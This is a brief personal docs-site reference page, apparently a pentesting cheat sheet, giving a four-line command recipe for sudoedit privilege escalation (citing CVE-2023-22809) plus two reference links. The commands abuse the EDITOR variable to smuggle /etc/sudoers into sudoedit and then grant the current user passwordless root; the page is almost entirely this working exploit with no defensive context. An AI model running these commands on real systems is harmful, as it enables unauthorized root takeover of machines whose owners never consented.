---
title: Sudoedit Privilege Escalation
description: A reference page in my new Starlight docs site.
---

### TL;TR

```
sudo -l
export EDITOR="vim -- /etc/sudoers"
sudoedit /tmp/vulnerable.txt
user ALL=(ALL:ALL) NOPASSWD:ALL
```

### References

- https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudoedit-privilege-escalation/
- https://www.synacktiv.com/sites/default/files/2023-01/sudo-CVE-2023-22809.pdf 
